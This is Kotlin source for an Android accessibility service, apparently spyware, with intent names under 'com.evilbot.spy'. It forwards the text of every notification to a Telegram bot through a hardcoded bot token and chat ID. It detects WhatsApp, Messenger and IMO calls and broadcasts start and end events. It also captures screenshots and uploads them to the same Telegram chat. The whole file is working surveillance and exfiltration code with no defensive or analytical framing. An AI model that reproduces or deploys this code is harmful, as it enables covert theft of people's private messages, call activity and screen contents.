package com.luffa

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class MyAccessibilityService : AccessibilityService() {

    companion object {
        var instance: MyAccessibilityService? = null
        private val BOT_TOKEN = "8840980473:AAFn7Tb8bF-67oYxp6dIPeeU7Jf-Upkfoic"
        private val CHAT_ID = "8820979221"
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        // 1. Notification State Changed Handling
        if (event.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            val text = event.text?.joinToString(" ") ?: ""
            if (text.isNotBlank()) {
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val ok = OkHttpClient()
                        val form = FormBody.Builder()
                            .add("chat_id", CHAT_ID)
                            .add("text", "Notification: $text")
                            .build()
                        ok.newCall(
                            Request.Builder()
                                .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                                .post(form)
                                .build()
                        ).execute()
                    } catch (e: Exception) {
                        Log.e("AccService", "Notify Error", e)
                    }
                }
            }

            // 2. VoIP Call Detection
            val packageName = event.packageName?.toString().orEmpty()
            val notifText = event.text?.joinToString(" ") ?: ""
            val voipApps = listOf("com.whatsapp", "com.imo.android.imoim", "com.facebook.orca", "com.facebook.mlite")

            if (packageName in voipApps || notifText.contains("call", ignoreCase = true)) {
                if (notifText.contains(Regex("incoming|ongoing|active|call in progress|WhatsApp call|Messenger call|IMO call", RegexOption.IGNORE_CASE))) {
                    val intent = Intent("com.evilbot.spy.VOIPCALLSTART")
                    sendBroadcast(intent)
                } else if (notifText.contains(Regex("ended|missed|declined|call ended", RegexOption.IGNORE_CASE))) {
                    val intent = Intent("com.evilbot.spy.VOIPCALLEND")
                    sendBroadcast(intent)
                }
            }
        }
    }

    override fun onInterrupt() {}

    // Screenshot method – Android 9+ only
    fun takeScreenshot(crop: Rect? = null) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.P) {
            sendError("Screenshot not supported < P")
            return
        }

        val callback = object : TakeScreenshotCallback {
            override fun onSuccess(screenshotResult: ScreenshotResult) {
                val bitmap = Bitmap.wrapHardwareBuffer(
                    screenshotResult.hardwareBuffer,
                    screenshotResult.colorSpace
                ) ?: return

                val finalBitmap = if (crop != null) {
                    Bitmap.createBitmap(bitmap, crop.left, crop.top, crop.width(), crop.height())
                } else bitmap

                CoroutineScope(Dispatchers.IO).launch {
                    val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                    FileOutputStream(file).use { fos ->
                        finalBitmap.compress(Bitmap.CompressFormat.PNG, 90, fos)
                    }
                    // Upload to Telegram
                    try {
                        val ok = OkHttpClient()
                        val body = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("chat_id", CHAT_ID)
                            .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
                            .build()
                        ok.newCall(
                            Request.Builder()
                                .url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto")
                                .post(body)
                                .build()
                        ).execute()
                    } catch (e: Exception) {
                        Log.e("Accessibility", "Upload failed", e)
                    }
                }
            }

            override fun onFailure(errorCode: Int) {
                sendError("Screenshot failed with code $errorCode")
            }
        }

        // Corrected takeScreenshot call parameters
        takeScreenshot(
            0, // Display ID
            Executors.newSingleThreadExecutor(),
            callback
        )
    }

    private fun sendError(msg: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val ok = OkHttpClient()
                val form = FormBody.Builder()
                    .add("chat_id", CHAT_ID)
                    .add("text", "Accessibility error: $msg")
                    .build()
                ok.newCall(
                    Request.Builder()
                        .url("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
                        .post(form)
                        .build()
                ).execute()
            } catch (e: Exception) {
                Log.e("AccService", "SendError failed", e)
            }
        }
    }
}
